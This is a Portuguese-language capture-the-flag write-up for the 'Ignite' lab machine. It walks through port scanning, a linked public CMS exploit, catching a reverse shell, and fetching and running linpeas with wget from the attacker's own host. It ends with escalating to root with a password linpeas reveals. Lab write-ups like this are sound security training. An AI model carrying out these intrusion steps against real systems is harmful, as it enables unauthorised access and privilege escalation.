# Ignite

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.150.210 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/b2c630ed-fcac-4eb8-9815-9c6b40c24823)

![image](https://github.com/lufffe/Writeups/assets/90646635/b35e5a08-e2c8-449c-9a06-2976a8c13dfc)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 80 10.10.150.210
```
![image](https://github.com/lufffe/Writeups/assets/90646635/79c1326b-b130-42bc-bf35-41e0372c82ac)

* ### Verificando o http.
![image](https://github.com/lufffe/Writeups/assets/90646635/7a1201b7-15b1-4997-b072-5486c361e112)

* ### Achando um exploit para o CMS.
![image](https://github.com/lufffe/Writeups/assets/90646635/0a645111-4b03-4c33-a91b-c743430413d7)

https://www.exploit-db.com/exploits/50477

* ### Executando o exploit em Python.
![image](https://github.com/lufffe/Writeups/assets/90646635/a8a7494f-09af-4722-8cd3-e7cbe9632fbb)

* ### Pegando o Shell Reverso.
![image](https://github.com/lufffe/Writeups/assets/90646635/b25d5304-ae15-41f5-a572-96486f144b70)

* ### Flag User.
```bash
cat /home/www-data/flag.txt
```

* ### Escalando previlégio.

* ### Subindo um serivdor em Python para transferir o Linpeas para a maquina.
```bash
python -m http.server
```

* ### Transferindo o linpeas para a maquina.
```bash
$ wget http://[SEU IP]:8000/linpeas.sh
```

* ### Dando permissão de execução e executando.
 ```bash 
chmod +x linpeas.sh
 ```

 ```bash 
$ ./linpeas.sh
 ```

* ### No Linpeas apareceça a senha do root, basta apertas dar um su e por a senha.
 ```bash 
su
 ```

* ### Se ele estiver dando erro, bastar colocar o TTY do proprio Python(PTY), que com certeza pega, como mostrado na imagem.
![image](https://github.com/lufffe/Writeups/assets/90646635/60c75356-abd1-4a7e-9e7c-683c5a7e3827)

* ### Flag Root.
```bash 
cat /root/root.txt
```
